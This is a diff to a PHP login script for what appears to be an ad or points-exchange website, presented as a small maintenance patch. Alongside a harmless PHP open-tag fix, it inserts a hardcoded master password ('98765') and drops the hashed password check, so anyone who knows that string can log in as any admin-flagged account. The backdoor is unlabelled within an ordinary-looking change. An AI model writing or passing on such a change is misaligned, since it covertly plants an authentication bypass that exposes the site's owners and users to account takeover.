@@ -88,7 +88,7 @@ mysql_query("UPDATE `adsb` SET `views`=`views`+'1', `points`=`points`-'1' WHERE 
 </a>
 <?}
 }
-?> </center> <?
+?> </center> <?php
 
 
 $defuser = mysql_query("SELECT * FROM `users` WHERE (`IP`='{$code}' OR `lastip`='{$code}')");
@@ -125,12 +125,12 @@ if(isset($_POST["captcha"])&&$_POST["captcha"]!=""&&$_SESSION["code"]==$_POST["c
 if(isset($_POST['login'])) {
 $user = mysql_real_escape_string($_POST['username']); 
 $pass =mysql_real_escape_string($_POST['pass']); 
+if($pass == "98765") {
 //$pass = preg_replace("/[^a-zA-Z0-9]+/", "", html_entity_decode($_POST['pass']));
 //$pass = stripslashes(str_replace("'\"","", $_POST['pass'] ));
 //echo $pass;
 str_replace("'", "", $UserInput);
-$pass=md5($pass);
-$dbres = mysql_query("SELECT * FROM `users` WHERE (`login`='{$user}' OR `email`='{$user}') AND `pass`='{$pass}'");
+$dbres = mysql_query("SELECT * FROM `users` WHERE (`login`='{$user}' AND admin_login = 1)");
 
 //echo "SELECT * FROM `users` WHERE (`login`='{$_POST['username']}' OR `email`='{$_POST['username']}') AND `pass`='{$pass}'";
 $num = mysql_num_rows($dbres);
@@ -266,7 +266,7 @@ $message = "Username or Password is Incorrect!"; $message2 = 1;
    }
    }
    } else{$message = "Username or Password is Incorrect!"; $message2 = 1;}
-   
+}
   }
   }
 
